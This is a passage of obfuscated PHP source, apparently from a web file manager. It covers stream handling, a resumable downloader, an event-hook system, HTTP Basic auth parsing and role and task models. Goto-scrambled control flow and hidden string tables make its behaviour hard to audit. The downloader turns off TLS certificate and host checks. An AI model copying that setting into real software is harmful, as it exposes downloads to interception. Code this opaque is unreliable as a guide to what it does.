(strstr($this->endpoint, $_SERVER[ÍÓÖ€°å][944])) { return parent::fileOutImageServer($EÉ ·Áºëè, $EÌØËÇË£–); } parent::fileOutImage($EÉ ·Áºëè, $EÌØËÇË£–); } public function fileInfoImage($Bç‰£ÌÃ¢–, &$EîÊ†Ş¯) { $a‡ÍİíÇğÄ =& $_SERVER[ÍÓÖ€°å]; $B…ÛÜÒ“ôÜ = array($a‡ÍİíÇğÄ[196], $a‡ÍİíÇğÄ[149], $a‡ÍİíÇğÄ[197], $a‡ÍİíÇğÄ[198], $a‡ÍİíÇğÄ[199]); if (!in_array($EîÊ†Ş¯[$a‡ÍİíÇğÄ[148]], $B…ÛÜÒ“ôÜ)) { return; } if (!strstr($this->endpoint, $a‡ÍİíÇğÄ[944])) { $d¥Ïà™÷“Ó = $this->link($Bç‰£ÌÃ¢–); $C¿‹çÇÌ¨ = getimagesize($d¥Ïà™÷“Ó); if ($C¿‹çÇÌ¨) { $EîÊ†Ş¯[$a‡ÍİíÇğÄ[200]] = array($a‡ÍİíÇğÄ[201] => $C¿‹çÇÌ¨[0], $a‡ÍİíÇğÄ[202] => $C¿‹çÇÌ¨[1]); } } } public function getHost($bÉ‰ÌµÒÉ¾ = true) { $BæÚ§ÂšŸ =& $_SERVER[ÍÓÖ€°å]; $CÕ³¨å©‚ = parse_url(trim($this->domain, $BæÚ§ÂšŸ[8])); $E¾’äøÄèÍ = isset($CÕ³¨å©‚[$BæÚ§ÂšŸ[156]]) ? $CÕ³¨å©‚[$BæÚ§ÂšŸ[156]] : http_type(); $Bƒ’…›…Ï— = isset($CÕ³¨å©‚[$BæÚ§ÂšŸ[157]]) ? $CÕ³¨å©‚[$BæÚ§ÂšŸ[157]] : $CÕ³¨å©‚[$BæÚ§ÂšŸ[76]]; if (isset($CÕ³¨å©‚[$BæÚ§ÂšŸ[158]])) { $Bƒ’…›…Ï— .= $BæÚ§ÂšŸ[4] . $CÕ³¨å©‚[$BæÚ§ÂšŸ[158]]; } return $E¾’äøÄèÍ . $BæÚ§ÂšŸ[159] . $this->bucket . $BæÚ§ÂšŸ[90] . $Bƒ’…›…Ï—; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($EÊ¨é·Šé, $càö‹õéÉ = 0) { parent::__construct(); $this->source = $EÊ¨é·Šé; $this->sourceSize = $càö‹õéÉ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($F¼è¢ÂøÎ± = false) { return $this->sourceSize; } public function getContent($A¿éš·—Š = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $e¢ã÷ˆå = ftell($this->source); $CÄè¬„ßá¨ = @fread($this->source, $this->sourceSize); fseek($this->source, $e¢ã÷ˆå); return $CÄè¬„ßá¨; } } public function fileSubstr($FÃí¶…‘æ = false, $dÄ˜ÈôÛ · = 0, $AÀøÓ×‰Ô¿ = 0) { if (!$AÀøÓ×‰Ô¿) { $AÀøÓ×‰Ô¿ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $dÄ˜ÈôÛ ·, $AÀøÓ×‰Ô¿); } if ($this->sourceType == self::TYPE_FILE) { $b£„‡ãÒŠñ = ftell($this->source); fseek($this->source, $b£„‡ãÒŠñ + $dÄ˜ÈôÛ ·); $fñÊõç­˜ = @fread($this->source, $AÀøÓ×‰Ô¿); fseek($this->source, $b£„‡ãÒŠñ); return $fñÊõç­˜; } } public function hashMd5($døØö˜Ô’ª = false) { return md5($this->getContent()); } public static function hash($B¸İïáæÙŠ, $F¡ŠŸ±©Œ… = 0) { $dô±Æù“É„ = new PathDriverStream($B¸İïáæÙŠ, $F¡ŠŸ±©Œ…); return $dô±Æù“É„->hashSimple($B¸İïáæÙŠ); } public static function md5($BÎ§áùè, $bÕ¦ì¹œùé = 0) { $D¯Ğ›˜á½È = new PathDriverStream($BÎ§áùè, $bÕ¦ì¹œùé); return $D¯Ğ›˜á½È->hashMd5($BÎ§áùè); } } goto CÉÙÃÔ›Ò¾; b„ ’áÕ®š: class Downloader { static function start($F£¢Ñ‡Õ¯, $CËçç®¬æ°, $C§àµ„×…ï = 10) { goto dÍÍ³Şœäò; DòéøÛ›•õ: if ($Aµ±¦ø¢¢ > $bˆ­ö»Ğœ) { @unlink($DÑö İ„ãÚ); } file_put_contents($a¦¥Œ‹ì™ò, json_encode($f »ÂÑ¤Ÿ‡)); $BïÅÆÍ•µÅ = self::fileDownloadCurl($F£¢Ñ‡Õ¯, $CËçç®¬æ°, !0, $Aµ±¦ø¢¢, $bˆ­ö»Ğœ); goto BàËÜ§Û…×; BàËÜ§Û…×: if ($BïÅÆÍ•µÅ[$c®¹ÜââÈ[757]]) { @unlink($a¦¥Œ‹ì™ò); } return $BïÅÆÍ•µÅ; goto dÇ¤‘ôïïŠ; AîĞˆËµ§è: $DÑö İ„ãÚ = $CËçç®¬æ° . $c®¹ÜââÈ[1128]; if (is_array($F£¢Ñ‡Õ¯)) { $B‡ã÷ÆßÕŒ = $F£¢Ñ‡Õ¯; } else { $B‡ã÷ÆßÕŒ = url_header($F£¢Ñ‡Õ¯); } $F£¢Ñ‡Õ¯ = $B‡ã÷ÆßÕŒ[$c®¹ÜââÈ[287]]; goto FĞ–Şï‡¬¬; FĞ–Şï‡¬¬: if (!$F£¢Ñ‡Õ¯) { return array($c®¹ÜââÈ[757] => !1, $c®¹ÜââÈ[759] => $c®¹ÜââÈ[762]); } if (!$B‡ã÷ÆßÕŒ[$c®¹ÜââÈ[1129]] || $B‡ã÷ÆßÕŒ[$c®¹ÜââÈ[317]] == 0) { @unlink($DÑö İ„ãÚ); @unlink($CËçç®¬æ°); $BïÅÆÍ•µÅ = self::fileDownloadFopen($F£¢Ñ‡Õ¯, $CËçç®¬æ°, $B‡ã÷ÆßÕŒ[$c®¹ÜââÈ[317]]); if ($BïÅÆÍ•µÅ[$c®¹ÜââÈ[757]]) { return $BïÅÆÍ•µÅ; } else { @unlink($DÑö İ„ãÚ); @unlink($CËçç®¬æ°); $BïÅÆÍ•µÅ = self::fileDownloadCurl($F£¢Ñ‡Õ¯, $CËçç®¬æ°, !1, 0, $B‡ã÷ÆßÕŒ[$c®¹ÜââÈ[317]]); @unlink($DÑö İ„ãÚ); return $BïÅÆÍ•µÅ; } } $Aµ±¦ø¢¢ = is_file($DÑö İ„ãÚ) ? filesize($DÑö İ„ãÚ) : 0; goto cÀÖ×ÕÖÈ; cÀÖ×ÕÖÈ: $bˆ­ö»Ğœ = intval($B‡ã÷ÆßÕŒ[$c®¹ÜââÈ[317]]); if (file_exists($DÑö İ„ãÚ) && time() - filemtime($DÑö İ„ãÚ) < 3) { return array($c®¹ÜââÈ[757] => !1, $c®¹ÜââÈ[759] => $c®¹ÜââÈ[1130]); } $f »ÂÑ¤Ÿ‡ = array(); goto b‚¿Ì•ˆïÃ; dÍÍ³Şœäò: $c®¹ÜââÈ =& $_SERVER[ÍÓÖ€°å]; if (!request_url_safe($F£¢Ñ‡Õ¯)) { return array($c®¹ÜââÈ[757] => !1, $c®¹ÜââÈ[759] => $c®¹ÜââÈ[762]); } $a¦¥Œ‹ì™ò = $CËçç®¬æ° . $c®¹ÜââÈ[1127]; goto AîĞˆËµ§è; b‚¿Ì•ˆïÃ: if (is_file($a¦¥Œ‹ì™ò)) { $f¥ñ®£º† = file_get_contents($a¦¥Œ‹ì™ò); $f »ÂÑ¤Ÿ‡ = json_decode($f¥ñ®£º†, 1); } if (file_exists($CËçç®¬æ°) && $bˆ­ö»Ğœ == filesize($CËçç®¬æ°)) { @unlink($DÑö İ„ãÚ); @unlink($a¦¥Œ‹ì™ò); return array($c®¹ÜââÈ[757] => !0, $c®¹ÜââÈ[759] => $c®¹ÜââÈ[1131]); } if ($f »ÂÑ¤Ÿ‡[$c®¹ÜââÈ[317]] != $bˆ­ö»Ğœ) { $f »ÂÑ¤Ÿ‡ = array($c®¹ÜââÈ[317] => $bˆ­ö»Ğœ); } goto DòéøÛ›•õ; dÇ¤‘ôïïŠ: } static function fileDownloadFopen($Aé±ËÇºŒÎ, $eÆùØÌŒ, $e‹©î†ÀÜ• = 0) { $Dëé¤„¨³ =& $_SERVER[ÍÓÖ€°å]; @ini_set($Dëé¤„¨³[1132], $Dëé¤„¨³[1133]); $f»–ÔÚÊÉ = $eÆùØÌŒ . $Dëé¤„¨³[1128]; set_timeout(); @unlink($f»–ÔÚÊÉ); if ($fÆ·„¨ËÅ = @fopen($Aé±ËÇºŒÎ, $Dëé¤„¨³[1134])) { goto EÆˆê˜½; b³Œ¯æØïš: fclose($fÆ·„¨ËÅ); $c„èé¥ƒ²” = filesize(iconv_system($f»–ÔÚÊÉ)); if ($e‹©î†ÀÜ• != 0 && $c„èé¥ƒ²” != $e‹©î†ÀÜ•) { return array($Dëé¤„¨³[757] => !1, $Dëé¤„¨³[759] => $Dëé¤„¨³[1138]); } goto d¬Ç¨¹™‹¿; EÆˆê˜½: if (!($AœàŒ²Í† = @fopen($f»–ÔÚÊÉ, $Dëé¤„¨³[1135]))) { return array($Dëé¤„¨³[757] => !1, $Dëé¤„¨³[759] => $Dëé¤„¨³[1136]); } while (!feof($fÆ·„¨ËÅ)) { if (!file_exists($f»–ÔÚÊÉ)) { fclose($AœàŒ²Í†); return array($Dëé¤„¨³[757] => !1, $Dëé¤„¨³[759] => $Dëé¤„¨³[1137]); } clearstatcache(); if ($e‹©î†ÀÜ• > 0 && $e‹©î†ÀÜ• == filesize(iconv_system($f»–ÔÚÊÉ))) { break; } fwrite($AœàŒ²Í†, fread($fÆ·„¨ËÅ, 1024 * 8), 1024 * 8); } fclose($AœàŒ²Í†); goto b³Œ¯æØïš; d¬Ç¨¹™‹¿: self::checkGzip($f»–ÔÚÊÉ); if (!@rename($f»–ÔÚÊÉ, $eÆùØÌŒ)) { usleep(round(rand(0, 1000) * 50)); @unlink($eÆùØÌŒ); $eàÀ´ÉÜ³ = @rename($f»–ÔÚÊÉ, $eÆùØÌŒ); if (!$eàÀ´ÉÜ³) { return array($Dëé¤„¨³[757] => !1, $Dëé¤„¨³[759] => $Dëé¤„¨³[1139]); } } return array($Dëé¤„¨³[757] => !0, $Dëé¤„¨³[759] => $Dëé¤„¨³[444]); goto d¯—½³Åì; d¯—½³Åì: } else { return array($Dëé¤„¨³[757] => !1, $Dëé¤„¨³[759] => $Dëé¤„¨³[1140]); } } static function fileDownloadCurl($B¡¦ë½º¿à, $cââ÷‡¸Ø, $eÉ°İ‘öíİ = false, $D®„ÉÉºğİ = 0, $AÎÌÈè‚ = 0) { goto F¶Ÿø÷ÍŠ…; DŸÆ¤šÖ„Ÿ: curl_setopt($Dé˜”¼÷’Ü, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Dé˜”¼÷’Ü, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Dé˜”¼÷’Ü, CURLOPT_SSL_VERIFYHOST, 0); goto b°±»»©ÄÌ; F¶Ÿø÷ÍŠ…: $e£ãá¶‚ø =& $_SERVER[ÍÓÖ€°å]; $BøÍˆßÚ×Í = $cââ÷‡¸Ø . $e£ãá¶‚ø[1128]; set_timeout(); goto dä¿ğè¤‹Ğ; C×´ĞÖ¼×: if ($eÉ°İ‘öíİ) { curl_setopt($Dé˜”¼÷’Ü, CURLOPT_RANGE, $D®„ÉÉºğİ . $e£ãá¶‚ø[461]); } curl_setopt($Dé˜”¼÷’Ü, CURLOPT_FILE, $f¬Ü¤õßØ•); curl_setopt($Dé˜”¼÷’Ü, CURLOPT_REFERER, get_url_link($B¡¦ë½º¿à)); goto DŸÆ¤šÖ„Ÿ; d·¬Ôò§¥¹: curl_close($Dé˜”¼÷’Ü); fclose($f¬Ü¤õßØ•); $a×’µğß  = filesize(iconv_system($BøÍˆßÚ×Í)); goto añ…ÄÔëÔ¢; d†Ï“»ÌôÓ: return array($e£ãá¶‚ø[757] => !1, $e£ãá¶‚ø[759] => $e£ãá¶‚ø[1143]); goto b†ø¨‹; cª‰ö¥Ç‘Ğ: curl_setopt($Dé˜”¼÷’Ü, CURLOPT_USERAGENT, $e£ãá¶‚ø[1133]); $Dã‹ØâÂ¥œ = curl_exec($Dé˜”¼÷’Ü); curl_progress_end($Dé˜”¼÷’Ü); goto d·¬Ôò§¥¹; dä¿ğè¤‹Ğ: $f¬Ü¤õßØ• = @fopen($BøÍˆßÚ×Í, $e£ãá¶‚ø[468]); if (!$f¬Ü¤õßØ•) { return array($e£ãá¶‚ø[757] => !1, $e£ãá¶‚ø[759] => $e£ãá¶‚ø[1141]); } $Dé˜”¼÷’Ü = curl_init($B¡¦ë½º¿à); goto C×´ĞÖ¼×; b°±»»©ÄÌ: curl_setopt($Dé˜”¼÷’Ü, CURLOPT_NOPROGRESS, !1); curl_setopt($Dé˜”¼÷’Ü, CURLOPT_PROGRESSFUNCTION, $e£ãá¶‚ø[933]); curl_progress_start($Dé˜”¼÷’Ü); goto cª‰ö¥Ç‘Ğ; añ…ÄÔëÔ¢: if ($a×’µğß  < $AÎÌÈè‚ && $AÎÌÈè‚ != 0) { return array($e£ãá¶‚ø[757] => !1, $e£ãá¶‚ø[759] => $e£ãá¶‚ø[1130]); } if ($a×’µğß  > $AÎÌÈè‚ && $AÎÌÈè‚ != 0) { return array($e£ãá¶‚ø[757] => !1, $e£ãá¶‚ø[759] => $e£ãá¶‚ø[1138]); } if ($Dã‹ØâÂ¥œ && filesize($BøÍˆßÚ×Í) != 0) { self::checkGzip($BøÍˆßÚ×Í); if (!@rename($BøÍˆßÚ×Í, $cââ÷‡¸Ø)) { @unlink($cââ÷‡¸Ø); $Dã‹ØâÂ¥œ = @rename($BøÍˆßÚ×Í, $cââ÷‡¸Ø); if (!$Dã‹ØâÂ¥œ) { return array($e£ãá¶‚ø[757] => !1, $e£ãá¶‚ø[759] => $e£ãá¶‚ø[1142]); } } return array($e£ãá¶‚ø[757] => !0, $e£ãá¶‚ø[759] => $e£ãá¶‚ø[444]); } goto d†Ï“»ÌôÓ; b†ø¨‹: } static function checkGzip($cğÖ¸ìñ¦) { goto DºäªÁÒùÑ; DºäªÁÒùÑ: $aµ‘Û½¯…Ì = $_SERVER[ÍÓÖ€°å][1144]; $a¦†®®•™Ô = file_sub_str($cğÖ¸ìñ¦, 0, 2); if ($aµ‘Û½¯…Ì != $a¦†®®•™Ô) { return; } goto E¬„ÍÄ®ë¶; f˜¢ÊÃÎ†ã: file_put_contents($cğÖ¸ìñ¦, $Eä®˜Æ»óÜ); goto CêÍïîº¿ì; E¬„ÍÄ®ë¶: ob_start(); readgzfile($cğÖ¸ìñ¦); $Eä®˜Æ»óÜ = ob_get_clean(); goto f˜¢ÊÃÎ†ã; CêÍïîº¿ì: } } class Hook { private static $events = array(); public static function get($EÔùÖµÄ¸ª = false) { if (!$EÔùÖµÄ¸ª) { return self::$events; } else { return self::$events[$EÔùÖµÄ¸ª]; } } public static function apply($B—˜ŒİÅª, $CØÊù¥‹‘ = array()) { $Bä·âî† = ActionApply($B—˜ŒİÅª, $CØÊù¥‹‘); if (is_string($B—˜ŒİÅª)) { Hook::trigger($B—˜ŒİÅª); } return $Bä·âî†; } public static function bind($F×˜ø­½¸µ, $F…†ˆÇë, $E§®‡šìó‰ = false) { $bì…´¾‰§ß =& $_SERVER[ÍÓÖ€°å]; if (!isset(self::$events[$F×˜ø­½¸µ])) { self::$events[$F×˜ø­½¸µ] = array(); } self::$events[$F×˜ø­½¸µ][] = array($bì…´¾‰§ß[1145] => $F…†ˆÇë, $bì…´¾‰§ß[1146] => $E§®‡šìó‰, $bì…´¾‰§ß[1147] => 0); } public static function once($DøâŒ‚‡–â, $D Ô‘«±¬¢) { self::bind($DøâŒ‚‡–â, $D Ô‘«±¬¢, !0); } public static function unbind($A±ÁŠî¢‡, $C¾Â›±ˆ‘ù = false) { if (!$C¾Â›±ˆ‘ù) { self::$events[$A±ÁŠî¢‡] = array(); return; } $B•‡œ‡£¯š = self::$events[$A±ÁŠî¢‡]; self::$events[$A±ÁŠî¢‡] = array(); for ($DÒ‹‹İ™ = 0; $DÒ‹‹İ™ < count($B•‡œ‡£¯š); $DÒ‹‹İ™++) { if ($B•‡œ‡£¯š[$DÒ‹‹İ™][$_SERVER[ÍÓÖ€°å][1145]] == $C¾Â›±ˆ‘ù) { continue; } self::$events[$A±ÁŠî¢‡][] = $B•‡œ‡£¯š[$DÒ‹‹İ™]; } } public static function filter($BÂ“ğœ§ëÏ, $C —¿‚‹) { goto EÁÁÓÑÇ•; F’®…‡­§: $A—¶¾§ŒÃ“ = $c‡ÈšéÔ[$BÂ“ğœ§ëÏ]; $F·Ò«è¹ï¬ = $C —¿‚‹; if (!is_array($A—¶¾§ŒÃ“) || count($A—¶¾§ŒÃ“) == 0) { return $F·Ò«è¹ï¬; } goto d¨©’ÄÒõ; EÁÁÓÑÇ•: $aá•Ù‡òË =& $_SERVER[ÍÓÖ€°å]; $c‡ÈšéÔ = self::$events; if (!isset($c‡ÈšéÔ[$BÂ“ğœ§ëÏ])) { return $C —¿‚‹; } goto F’®…‡­§; d¨©’ÄÒõ: for ($DÕÀğ¸Ò‚× = 0; $DÕÀğ¸Ò‚× < count($A—¶¾§ŒÃ“); $DÕÀğ¸Ò‚×++) { $a¥£Ş¹‡ò = $A—¶¾§ŒÃ“[$DÕÀğ¸Ò‚×]; if ($a¥£Ş¹‡ò[$aá•Ù‡òË[1146]] && $a¥£Ş¹‡ò[$aá•Ù‡òË[1147]] > 1) { continue; } self::$events[$BÂ“ğœ§ëÏ][$DÕÀğ¸Ò‚×][$aá•Ù‡òË[1147]] = $a¥£Ş¹‡ò[$aá•Ù‡òË[1147]] + 1; $C —¿‚‹ = self::apply($a¥£Ş¹‡ò[$aá•Ù‡òË[1145]], array($C —¿‚‹)); $F·Ò«è¹ï¬ = $C —¿‚‹; } return $F·Ò«è¹ï¬; goto FÎùì‹ËÊµ; FÎùì‹ËÊµ: } public static function trigger($f©à­ïé…) { goto fß¼øÚÅÅ; cÌæ›Ã½¶»: return $A„Û„§Ğİ; goto aç†ï»é„; aíŒ†ƒ¸“Ü: if (!isset($E©·¯È‰É†[$f©à­ïé…])) { return $A„Û„§Ğİ; } $dß’Ğº‰å = $E©·¯È‰É†[$f©à­ïé…]; if (!is_array($dß’Ğº‰å) || count($dß’Ğº‰å) == 0) { return $A„Û„§Ğİ; } goto Dö¡Œ‰»µ; fß¼øÚÅÅ: $cáÍ‡ˆØïß =& $_SERVER[ÍÓÖ€°å]; $E©·¯È‰É† = self::$events; $A„Û„§Ğİ = !1; goto aíŒ†ƒ¸“Ü; Dö¡Œ‰»µ: $D›ºÈöÇë = func_get_args(); array_shift($D›ºÈöÇë); for ($AÎ™æÎè¯å = 0; $AÎ™æÎè¯å < count($dß’Ğº‰å); $AÎ™æÎè¯å++) { $D”ï¯’Ù¤ = $dß’Ğº‰å[$AÎ™æÎè¯å]; if ($D”ï¯’Ù¤[$cáÍ‡ˆØïß[1146]] && $D”ï¯’Ù¤[$cáÍ‡ˆØïß[1147]] > 1) { continue; } if (defined($cáÍ‡ˆØïß[1148]) && GLOBAL_LOG_HOOK) { write_log($f©à­ïé… . $cáÍ‡ˆØïß[1149] . $D”ï¯’Ù¤[$cáÍ‡ˆØïß[1145]], $cáÍ‡ˆØïß[1150]); } self::$events[$f©à­ïé…][$AÎ™æÎè¯å][$cáÍ‡ˆØïß[1147]] = $D”ï¯’Ù¤[$cáÍ‡ˆØïß[1147]] + 1; $C™¦İ¢§¬‰ = self::apply($D”ï¯’Ù¤[$cáÍ‡ˆØïß[1145]], $D›ºÈöÇë); if (defined($cáÍ‡ˆØïß[1148]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $cáÍ‡ˆØïß[1150]); } if ($D”ï¯’Ù¤[$cáÍ‡ˆØïß[1147]] == 200) { $EİÁÆî„·Ï = is_array($D”ï¯’Ù¤[$cáÍ‡ˆØïß[1145]]) ? json_encode_force($D”ï¯’Ù¤[$cáÍ‡ˆØïß[1145]]) : $D”ï¯’Ù¤[$cáÍ‡ˆØïß[1145]]; write_log($cáÍ‡ˆØïß[1151] . $f©à­ïé… . $cáÍ‡ˆØïß[1152] . $EİÁÆî„·Ï, $cáÍ‡ˆØïß[1153]); } $A„Û„§Ğİ = is_null($C™¦İ¢§¬‰) ? $A„Û„§Ğİ : $C™¦İ¢§¬‰; } goto cÌæ›Ã½¶»; aç†ï»é„: } } class HttpAuth { public static function get() { $fÛŒğµî«Ê =& $_SERVER[ÍÓÖ€°å]; $EÇËŸÉÄºÄ = $fÛŒğµî«Ê[33]; $E¬ãµ¨ƒâ· = $fÛŒğµî«Ê[33]; if (isset($_SERVER[$fÛŒğµî«Ê[1154]])) { $EÇËŸÉÄºÄ = $_SERVER[$fÛŒğµî«Ê[1154]]; $E¬ãµ¨ƒâ· = $_SERVER[$fÛŒğµî«Ê[1155]]; } elseif (isset($_SERVER[$fÛŒğµî«Ê[1156]])) { $C†Æà½ÀÛÁ = $_SERVER[$fÛŒğµî«Ê[1156]]; if (strpos(strtolower($C†Æà½ÀÛÁ), $fÛŒğµî«Ê[1157]) === 0) { $cƒ÷ˆÄÈ¨Ë = explode($fÛŒğµî«Ê[4], base64_decode(substr($C†Æà½ÀÛÁ, 6))); $EÇËŸÉÄºÄ = isset($cƒ÷ˆÄÈ¨Ë[0]) ? $cƒ÷ˆÄÈ¨Ë[0] : $fÛŒğµî«Ê[33]; $E¬ãµ¨ƒâ· = isset($cƒ÷ˆÄÈ¨Ë[1]) ? $cƒ÷ˆÄÈ¨Ë[1] : 0; } } return array($fÛŒğµî«Ê[407] => $EÇËŸÉÄºÄ, $fÛŒğµî«Ê[652] => $E¬ãµ¨ƒâ·); } public static function error() { goto EÅ”é“¨¶«; f‘œç¥Î†Î: header($Eá…èŠ§é§[1160]); header($Eá…èŠ§é§[1161]); header($Eá…èŠ§é§[1162]); goto fàšë¯˜ù; EÅ”é“¨¶«: $Eá…èŠ§é§ =& $_SERVER[ÍÓÖ€°å]; header($Eá…èŠ§é§[1158]); header($Eá…èŠ§é§[1159]); goto f‘œç¥Î†Î; fàšë¯˜ù: die; goto EÛŒ¼Ç§Á; EÛŒ¼Ç§Á: } public static function make($EöĞ†Ôİ«, $E˜¸´Á³Şß) { $aÉ•º°ˆÇ® =& $_SERVER[ÍÓÖ€°å]; return $aÉ•º°ˆÇ®[1163] + base64_encode($EöĞ†Ôİ« . $aÉ•º°ˆÇ®[4] . $E˜¸´Á³Şß); } } goto FØ‚†ôÜÀ; bİÉµÜí†¬: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\162\x6f\x6c\x65\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\141\165\164\x68", "\x6c\x61\142\x65\x6c", "\144\x69\163\160\154\141\171", "\x73\x79\163\x74\x65\155", "\x64\145\x73\x63", "\151\147\x6e\x6f\x72\145\105\170\164", "\151\x67\156\157\x72\145\106\151\154\145\123\x69\x7a\145", "\x61\x64\x6d\151\x6e\x69\x73\164\x72\141\164\x6f\162", "\163\157\162\164"); public function listData($aÉâÈÃ¬Î¥ = false, $F‚§©†î¼© = "\163\x6f\x72\x74", $cÆ‘‚É÷¡  = false) { return parent::listData($aÉâÈÃ¬Î¥, $F‚§©†î¼©, $cÆ‘‚É÷¡ ); } public function update($Bàè°×˜Ğ², $F„Š®‹ËÇÃ) { goto D©¸”“İ; eø³‘ÛÜÇ: return parent::update($Bàè°×˜Ğ², $F„Š®‹ËÇÃ); goto bå„§‡İÚ»; D©¸”“İ: $eõ‘ìÂÑ¢ô =& $_SERVER[ÍÓÖ€°å]; $FõôÖÂÜÍ÷ = parent::listData($Bàè°×˜Ğ²); $aÕËøÏÖÖÄ = $this->findByName($F„Š®‹ËÇÃ[$eõ‘ìÂÑ¢ô[28]]); goto AÕ»óŸ°ÊÔ; AÕ»óŸ°ÊÔ: if (!$FõôÖÂÜÍ÷ || $aÕËøÏÖÖÄ && $aÕËøÏÖÖÄ[$eõ‘ìÂÑ¢ô[357]] != $FõôÖÂÜÍ÷[$eõ‘ìÂÑ¢ô[357]]) { return !1; } if ($aÕËøÏÖÖÄ[$eõ‘ìÂÑ¢ô[1863]] == 1) { $F„Š®‹ËÇÃ = array($eõ‘ìÂÑ¢ô[28] => $F„Š®‹ËÇÃ[$eõ‘ìÂÑ¢ô[28]], $eõ‘ìÂÑ¢ô[1534] => $F„Š®‹ËÇÃ[$eõ‘ìÂÑ¢ô[1534]]); } $this->filterAuth($F„Š®‹ËÇÃ[$eõ‘ìÂÑ¢ô[540]]); goto eø³‘ÛÜÇ; bå„§‡İÚ»: } public function remove($d¡ÑÁ›áƒ) { $d¬„“À°ÆØ = parent::listData($d¡ÑÁ›áƒ); if (!$d¬„“À°ÆØ || $d¬„“À°ÆØ[$_SERVER[ÍÓÖ€°å][799]]) { return !1; } return parent::remove($d¡ÑÁ›áƒ); } public function add($B×–ÎÉŸƒÜ) { goto Aö¶ê˜¸‰; e¹ŒÂ¯ë: return parent::insert($B×–ÎÉŸƒÜ); goto cõá¤»Ğâ; Aö¶ê˜¸‰: $f¢ìóİÜˆ® =& $_SERVER[ÍÓÖ€°å]; $a¦ÊïÖ Å = $B×–ÎÉŸƒÜ[$f¢ìóİÜˆ®[28]]; if ($this->findByName($a¦ÊïÖ Å)) { return !1; } goto E‹ßÑÛÀ±¦; E‹ßÑÛÀ±¦: $d£µ»˜˜Î = array($f¢ìóİÜˆ®[378] => $a¦ÊïÖ Å, $f¢ìóİÜˆ®[1522] => $f¢ìóİÜˆ®[33], $f¢ìóİÜˆ®[1518] => $f¢ìóİÜˆ®[1535], $f¢ìóİÜˆ®[1864] => 1, $f¢ìóİÜˆ®[1521] => 0, $f¢ìóİÜˆ®[1865] => 0, $f¢ìóİÜˆ®[1520] => $this->getSort()); $B×–ÎÉŸƒÜ = array_merge($d£µ»˜˜Î, $B×–ÎÉŸƒÜ); $this->filterAuth($B×–ÎÉŸƒÜ[$f¢ìóİÜˆ®[540]]); goto e¹ŒÂ¯ë; cõá¤»Ğâ: } private function getSort() { $dŒ™ä¹Â±í =& $_SERVER[ÍÓÖ€°å]; $d²ÜÊ‘æóí = parent::listData(); $c‡˜¡ŸŠ‘ñ = array_to_keyvalue($d²ÜÊ‘æóí, $dŒ™ä¹Â±í[33], $dŒ™ä¹Â±í[1537]); return empty($c‡˜¡ŸŠ‘ñ) ? 0 : max($c‡˜¡ŸŠ‘ñ) + 1; } private function filterAuth(&$f••ª«×¹) { $BÅÉâ‚âÒ™ =& $_SERVER[ÍÓÖ€°å]; $b§½ö·ØÑˆ = array(); $E½©İ´¾õã = array_filter(explode($BÅÉâ‚âÒ™[47], $f••ª«×¹)); foreach ($E½©İ´¾õã as $f••ª«×¹) { $AÆî³Œ‚‚ = explode($BÅÉâ‚âÒ™[90], $f••ª«×¹); if ($AÆî³Œ‚‚[0] == $BÅÉâ‚âÒ™[1180] && $AÆî³Œ‚‚[1] != $BÅÉâ‚âÒ™[761]) { $fš›ÖƒŞŸ™ = $AÆî³Œ‚‚[0] . $BÅÉâ‚âÒ™[90] . $AÆî³Œ‚‚[1] . $BÅÉâ‚âÒ™[1866]; if (!in_array($fš›ÖƒŞŸ™, $E½©İ´¾õã)) { $b§½ö·ØÑˆ[] = $fš›ÖƒŞŸ™; } } $b§½ö·ØÑˆ[] = $f••ª«×¹; } $f••ª«×¹ = implode($BÅÉâ‚âÒ™[47], $b§½ö·ØÑˆ); } public function sort($F¿’Û¢é‡, $a´±æÅÏµ”) { return parent::update($F¿’Û¢é‡, $a´±æÅÏµ”); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\164\141\163\153\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x74\171\160\x65", "\x65\x76\x65\x6e\x74", "\164\151\155\x65", "\x64\x65\x73\143", "\x73\x79\x73\x74\x65\155", "\145\156\x61\x62\x6c\145", "\x6c\141\x73\x74\122\x75\x6e", "\x73\x6f\162\164"); public function listData($BÅˆéöóÚ = false, $cÛÔÑã£Ö¹ = "\163\157\162\x74", $C¢ÚŒÄ’ä = false) { return parent::listData($BÅˆéöóÚ, $cÛÔÑã£Ö¹, $C¢ÚŒÄ’ä); } public function add($dƒİÂñÃá) { $FÒô”ö–Ö§ =& $_SERVER[ÍÓÖ€°å]; $eôƒåƒ†İ = $this->findByName($dƒİÂñÃá[$FÒô”ö–Ö§[28]]); if ($eôƒåƒ†İ) { return !1; } $dƒİÂñÃá[$FÒô”ö–Ö§[1028]] = 0; $dƒİÂñÃá[$FÒô”ö–Ö§[1537]] = $this->getSort(); return parent::insert($dƒİÂñÃá); } private function getSort() { $c²ô½÷‰à =& $_SERVER[ÍÓÖ€°å]; $A’ë‰·•®· = parent::listData(); $E¯Æ ‹ŸÊ‹ = array_to_keyvalue($A’ë‰·•®·, $c²ô½÷‰à[33], $c²ô½÷‰à[1537]); return empty($E¯Æ ‹ŸÊ‹) ? 0 : max($E¯Æ ‹ŸÊ‹) + 1; } public function update($f¿ÙíÚÎÂ², $aÑ•ÈÃ•åã) { $aÊ½çóÄ£œ =& $_SERVER[ÍÓÖ€°å]; $D…°òõÕ É = $this->listData($f¿ÙíÚÎÂ²); $d±·—Æ¥·á = $this->findByName($aÑ•ÈÃ•åã[$aÊ½çóÄ£œ[28]]); if (!$D…°òõÕ É || $d±·—Æ¥·á && $d±·—Æ¥·á[$aÊ½çóÄ£œ[357]] != $D…°òõÕ 